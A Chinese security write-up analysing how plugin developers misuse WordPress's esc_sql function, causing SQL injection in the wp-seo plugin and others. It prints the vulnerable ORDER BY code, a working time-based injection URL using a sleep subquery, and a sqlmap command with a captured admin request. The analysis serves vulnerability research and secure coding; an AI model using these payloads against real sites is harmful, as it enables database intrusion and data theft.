# 分析WordPress中esc_sql函数引起的注入危害

0x00 背景
=======

* * *

这篇文章说的不是esc_sql函数自身有什么逻辑上缺陷或者不足，而是说下关于二次开发者错误的使用此函数引起的注入漏洞。

在wordpress手册中关于esc_sql的解释，在以前的版本中，官方并没有说出这个函数有任何问题：

![enter image description here](http://drops.javaweb.org/uploads/images/91990e0e5800a612bc9366c6d51ba0a2fb94fd53.jpg)

在近期的wordpress手册中说出了这个函数如果错误使用会造成注入漏洞：

![enter image description here](http://drops.javaweb.org/uploads/images/3d24eaa29f19c6f5b0b27c80961df37c28259945.jpg)

0x01 分析
=======

* * *

我们再看下esc_sql的实现：

```
function esc_sql( $data ) {
    global $wpdb;
    return $wpdb->_escape( $data );
}
function _escape( $data ) {
    if ( is_array( $data ) ) {
        foreach ( $data as $k => $v ) {
            if ( is_array($v) )
                $data[$k] = $this->_escape( $v );
            else
                $data[$k] = $this->_real_escape( $v );
            }
        } else {
    $data = $this->_real_escape( $data );
    }
    return $data;
}
function _real_escape( $string ) {
    if ( $this->dbh ) {
        if ( $this->use_mysqli ) {
            return mysqli_real_escape_string( $this->dbh, $string );
        } else {
    return mysql_real_escape_string( $string, $this->dbh );
    }
}
$class = get_class( $this );
if ( function_exists( '__' ) ) {
    _doing_it_wrong( $class, sprintf( __( '%s must set a database connection for use with escaping.' ), $class ), E_USER_NOTICE );
} else {
    _doing_it_wrong( $class, sprintf( '%s must set a database connection for use with escaping.', $class ), E_USER_NOTICE );
}
    return addslashes( $string );
}

```

通过对比上面两个手册和代码我们可以清晰的得出以下几个结论：

*   1.  99%的情况下你可以使用$wpdb->prepare()函数来做数据库操作（有那些是哪不能的1%呢？order by、like···· ）
*   1.  esc_sql是addslashes()函数的数组应用，但是esc_sql转义数组的时候只转义数组值。
*   1.  esc_sql并没有对输入数据自动加引号保护

由于老版本手册的说明不严谨问题，在很多二次开发者使用esc_sql函数的时候出现了注入漏洞。

wp-seo插件注入漏洞

在文件admin/class-bulk-editor-list-table.php中：

```
protected function parse_item_query( $subquery, $all_states, $post_type_clause ) {

    // Order By block
    $orderby = ! empty( $_GET['orderby'] ) ? esc_sql( sanitize_text_field( $_GET['orderby'] ) ) : 'post_title';
    $order   = 'ASC';

    if ( ! empty( $_GET['order'] ) ) {
        $order = esc_sql( strtoupper( sanitize_text_field( $_GET['order'] ) ) );
    }

    // Get all needed results
    $query = "
    SELECT ID, post_title, post_type, post_status, post_modified, post_date
    FROM {$subquery}
    WHERE post_status IN ({$all_states}) $post_type_clause
    ORDER BY {$orderby} {$order}
    LIMIT %d,%d
    ";

    return $query;
}

```

其中很明显的漏洞出现了，然后就是构造poc：

```
http://192.168.9.102/wordpress/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby=post_date%2c(select%20*%20from%20(select(sleep(10)))a)&order=asc

```

如何使用sqlmap在order by后面延时注入，可以请参考：http://drops.wooyun.org/tips/5254自写，也可以抓包：

```
python sqlmap.py -r 2.txt --technique=B --dbms=MySQL -D wordpress --tables
GET /wordpress/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby=pos$
Host: 192.168.9.102
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=$
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like$
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: wordpress_1d5e8f89471a6349f1caf2e6b8aa4232=admin%7C1426827482%7CjKzM166$...

```

出现这样漏洞的插件还有：

```
WooCommerce 2.3 – 2.3.5
Pods 1.10 <= 2.5.1.1
AffiliateWP < 1.5.7
WP All Import < 4.1.2
Gravity Forms < 1.9.4

```

0x02 总结：
========

* * *

从上面的分析和出现的已知漏洞不难看出，此函数滥用的插件应该不在少数。